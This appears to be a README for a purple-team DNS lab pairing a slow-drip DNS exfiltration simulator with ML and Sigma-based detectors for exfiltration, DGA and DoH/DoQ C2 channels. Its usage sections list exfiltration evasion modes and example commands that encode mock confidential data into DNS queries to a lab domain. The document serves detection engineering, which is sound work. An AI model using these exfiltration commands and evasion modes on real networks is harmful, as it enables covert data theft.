[dns_purple_lab_README_v2.md](https://github.com/user-attachments/files/26832104/dns_purple_lab_README_v2.md)
# dns-purple-lab

> **Purple Team DNS Security Research Lab**  
> Attack simulation · Detection engineering · MTTD/MTTR measurement

[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://python.org)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-T1071.004-red.svg)](https://attack.mitre.org/techniques/T1071/004/)

DNS saldırı simülasyonu, tespit mühendisliği ve ölçüm için izole lab ortamı.

---

## ⚠️ Legal Notice

**CONTROLLED ENVIRONMENT ONLY.**  
Bu araçlar yalnızca sahip olduğunuz veya **yazılı izin aldığınız** ağlarda kullanım içindir.  
Docker Compose konfigürasyonu varsayılan olarak dış ağ erişimini devre dışı bırakır.  
These tools are for defensive research and authorized penetration testing only.

---

##  Repository Structure

```
dns-purple-lab/
├── tools/
│   ├── dns_anomaly_detector.py     Blue Team: DNS exfil + DGA + ML detection
│   ├── dns_exfil_sim.py            Purple Team: Slow-drip / burst simulation
│   ├── encrypted_dns_hunter.py     Blue Team: DoH/DoQ C2 detection
│   └── docker-compose.yml          Isolated lab environment
│
├── config/
│   ├── unbound.conf                Verbose logging resolver config
│   └── zeek/
│       └── local.zeek              DNS + QUIC logging policy
│
├── sigma_rules/
│   ├── long_lived_quic_c2.yml
│   ├── c2_handshake_fingerprint.yml
│   └── doh_entropy_exfil.yml
│
├── data/
│   └── test_payloads/              Sample lab data for simulation
│
└── README.md
```

---

## Quick Start

### Option A: Tools Only (no Docker)

```bash
# Dependencies
pip install dnspython scikit-learn numpy scapy

# Run DNS anomaly detector (demo mode)
python tools/dns_anomaly_detector.py --demo

# Run encrypted DNS hunter (demo mode)
python tools/encrypted_dns_hunter.py --demo

# Run exfil simulator (dry-run, no queries sent)
python tools/dns_exfil_sim.py --demo
```

### Option B: Full Lab (Docker Compose)

```bash
# Start all services
docker compose -f tools/docker-compose.yml up -d

# Check status
docker compose ps

# Terminal 1: Start monitoring
docker compose exec monitoring \
  python dns_anomaly_detector.py --zeek /logs/zeek/dns.log

# Terminal 2: Run simulation
docker compose exec attacker \
  python dns_exfil_sim.py \
    --text "Simulated sensitive data" \
    --domain lab.internal \
    --resolver 172.20.0.20 \
    --mode slow-drip --delay 30 --jitter --live
```
KRİTİK: Linux üzerinde Elasticsearch'ün çökmemesi için labı başlatmadan önce şu komutu çalıştırın:
CRITICAL: To prevent Elasticsearch from crashing on Linux, run this command before starting the lab:

sudo sysctl -w vm.max_map_count=262144
---

## 🛠️ Tool Reference

### 1. dns_anomaly_detector.py

ML-powered DNS exfiltration and DGA detection engine.

```
Usage:
  python dns_anomaly_detector.py [OPTIONS]

Input:
  --demo              Synthetic dataset (benign + 4 attack patterns)
  --zeek FILE         Zeek dns.log (JSON or TSV format)
  --pcap  FILE        PCAP file (requires scapy)

Output:
  --json FILE         Write JSON report
  --csv  FILE         Write CSV report
  --quiet             Show only CRITICAL/HIGH alerts

Options:
  --no-ml             Skip Isolation Forest (faster, fewer deps)

Exit codes:
  0 = clean or MEDIUM only
  1 = HIGH or CRITICAL detected (useful for CI/CD)

Detects:
  • High entropy subdomains (Base32/64/hex payloads)    entropy > 3.8
  • Long subdomain labels                               >40 chars
  • Deep label nesting                                  >5 labels
  • Hex-encoded payloads                                hex_ratio > 50%
  • DGA domains (consonant-heavy, entropic apexes)
  • Slow-drip exfiltration (behavioral baseline)        unique_ratio > 80%
  • DNS tunneling (high query rate to apex)             >30 qpm
  • Fast-flux (TTL instability)                         min_ttl < 60s
  • ML: Isolation Forest statistical outliers
```

**Example output:**
```
╔══════════════════════════════════════════════════════╗
║          DNS Anomaly Detector — Report               ║
╚══════════════════════════════════════════════════════╝
  Queries analyzed : 82
  Total alerts     : 18
  CRITICAL: 0  HIGH: 1  MEDIUM: 17

  ── Alert #1 ────────────────────────────────────────
  [█████░░░░░] 55/100  HIGH
  Category  : dns_exfiltration_candidate
  Source IP : 10.0.0.42
  Query     : 6b616d696e73747261766572736b69793130313031.x.io
  Reasons   : long_subdomain(42chars) | hex_encoded(100%) | digit_heavy(90%)
```

---

### 2. dns_exfil_sim.py

Slow-drip covert channel simulation for detection validation.

```
Usage:
  python dns_exfil_sim.py [OPTIONS]

Input:
  --demo              Run all 4 modes in dry-run (interactive)
  --file FILE         File to simulate exfiltrating
  --text TEXT         Inline text payload

Modes:
  --mode slow-drip    Low-rate, jittered queries (default)
  --mode burst        Rapid queries (tests volume detection)
  --mode fragmented   Multi-label encoding (evades length checks)
  --mode decoy-mix    Real queries mixed with benign decoys

Options:
  --domain DOMAIN     Apex domain (default: lab.internal)
  --resolver IP       Lab DNS resolver IP (default: 127.0.0.1)
  --encoding ENC      base32 | base64url | hex (default: base32)
  --qtype TYPE        A | TXT | CNAME (default: A)
  --delay SEC         Base delay between queries (default: 30)
  --jitter            Randomize delay ±40-60%
  --live              Send real queries (REQUIRES lab resolver)
  --dry-run           Print only, send nothing (DEFAULT when no --live)
  --verbose           Show all queries including decoys
```

**ALWAYS use --dry-run when testing without a lab resolver.**

---

### 3. encrypted_dns_hunter.py

DoH / DoQ / QUIC C2 channel detector with ML.

```
Usage:
  python encrypted_dns_hunter.py [OPTIONS]

Input:
  --demo              Synthetic connections (legitimate + C2 patterns)
  --conn FILE         Zeek conn.log
  --quic FILE         Zeek quic.log (optional, richer fingerprinting)

Output:
  --json FILE         Write JSON report
  --sigma DIR         Generate Sigma rules to directory

Options:
  --no-ml             Skip Isolation Forest

Detects:
  • Long-lived QUIC/DoQ sessions      duration > 1h → HIGH, > 4h → CRITICAL
  • C2 handshake fingerprints         Merlin, Cobalt Strike QUIC patterns
  • DoH beaconing                     uniform payload CoV + regular interval CoV
  • ML: Isolation Forest on conn features (duration, byte ratio, pkt ratio)
```

**Example output:**
```
╔══════════════════════════════════════════════════════╗
║       Encrypted DNS Hunter  v2.0  —  Report         ║
╚══════════════════════════════════════════════════════╝
  Connections analyzed : 116
  Total alerts         : 7
  CRITICAL: 1  HIGH: 2  MEDIUM: 4

  [██████████] 100/100  CRITICAL
  Category  : long_lived_quic_c2
  10.0.0.42 → 185.220.101.99:853
  MITRE     : T1071.004
    • duration(24.0h)
    • byte_ratio(resp/orig=0.35)

  [█████████░] 90/100   HIGH
  Category  : doh_beaconing
    • uniform_payload(cv=0.000,mean=248B)
    • regular_interval(cv=0.000,avg=30s)
```

---

## 📊 Purple Team Scenarios

### Scenario 1: Slow Drip Exfiltration

**Objective:** Measure MTTD for slow, low-volume DNS exfiltration.

```bash
# Step 1: Baseline — run detector before attack
python dns_anomaly_detector.py --zeek /logs/zeek/dns.log --json before.json

# Step 2: Start simulation (lab resolver required for --live)
python dns_exfil_sim.py \
  --text "CORP_CONFIDENTIAL:employee_db_export:payroll_2025" \
  --domain lab.internal \
  --resolver 127.0.0.1 \
  --mode slow-drip \
  --delay 45 --jitter --dry-run   # Remove --dry-run for live test

# Step 3: Analyze
python dns_anomaly_detector.py --zeek /logs/zeek/dns.log --json after.json

# Step 4: Record MTTD
echo "MTTD = time from first exfil query to first HIGH alert"
```

**Expected MTTD:**
- Entropy alerts: **immediate** (per-query)
- Behavioral slow-drip: **after ~15 queries** (~12 min at 45s delay)

---

### Scenario 2: DoQ C2 Channel

**Objective:** Measure detection time for long-lived encrypted C2 session.

```bash
# Simulate Zeek logs with a 24h QUIC session
python -c "
import json, time
# Inject synthetic long session into conn.log
record = {
  'ts': time.time(), 'proto': 'udp', 'service': 'quic',
  'id.orig_h': '10.0.0.42', 'id.orig_p': 51234,
  'id.resp_h': '185.220.101.99', 'id.resp_p': 853,
  'duration': 86400, 'orig_bytes': 52480, 'resp_bytes': 18240,
  'history': 'ISishIH', 'orig_pkts': 340, 'resp_pkts': 120
}
print(json.dumps(record))
" >> /tmp/conn.log

python encrypted_dns_hunter.py --conn /tmp/conn.log
```

---

### Scenario 3: Cache Poisoning Simulation (Defensive Reference)

**Objective:** Establish ServFail rate baseline for TuDoor/RebirthDay simulation.

See `config/cache_poison_sim.md` for packet generation setup using scapy.

---

## 📋 KPI Tracking Template

After each scenario, fill in this table:

| Date | Scenario | Attack Start | First Alert | MTTD | Isolation | MTTR | FP Count |
|------|----------|-------------|-------------|------|-----------|------|----------|
| | Slow Drip | | | | | | |
| | DoQ C2 | | | | | | |
| | Cache Poison | | | | | | |

Track improvements over successive runs. Target: MTTD < 4h, MTTR < 30min.

---

## 🔍 MITRE ATT&CK Coverage

| Technique | Name | Covered By |
|-----------|------|-----------|
| T1071.004 | DNS Application Layer Protocol | All 3 tools |
| T1048.003 | Exfiltration Over Alt Protocol | dns_anomaly_detector |
| T1568.001 | Fast Flux DNS | dns_anomaly_detector |
| T1568.002 | Domain Generation Algorithms | dns_anomaly_detector |
| T1090 | Proxy via DNS Tunneling | dns_anomaly_detector |
| T1071.001 | C2 via Web Protocols (DoH) | encrypted_dns_hunter |

---

## 📚 References

| Resource | Link |
|----------|------|
| TuDoor (IEEE S&P 2024) | https://tudoor.net |
| RebirthDay CVE-2025-5994 | NVD |
| BIND 9 CVE-2025-40778 | NVD |
| MCP Inspector CVE-2025-49596 | NVD |
| Merlin C2 Framework | GitHub |
| Zeek Documentation | https://docs.zeek.org |
| RITA (behavioral analytics) | https://github.com/activecm/rita |
| MITRE ATT&CK T1071.004 | https://attack.mitre.org/techniques/T1071/004/ |

---

## Descriptions

If you build on this lab, here's how to describe it:

```
• Built ML-powered DNS exfiltration detector (Shannon entropy + 
  Isolation Forest) with Zeek/pcap input; 0% false positive rate 
  on whitelisted benign domains

• Developed slow-drip DNS covert channel simulator with 4 evasion 
  modes, jitter, and decoy interleaving for Blue Team detection tuning

• Designed DoH/DoQ C2 detection engine using QUIC handshake fingerprinting 
  (Merlin framework signatures) and beacon regularity analysis (payload CoV)

• Built Purple Team lab measuring MTTD/MTTR across DNS exfiltration, 
  DoQ C2, and cache poisoning scenarios; reduced MTTD from no-detection 
  to <2 minutes for entropy-based attacks
```

---

*Use only in networks you own or have explicit written authorization to test.*
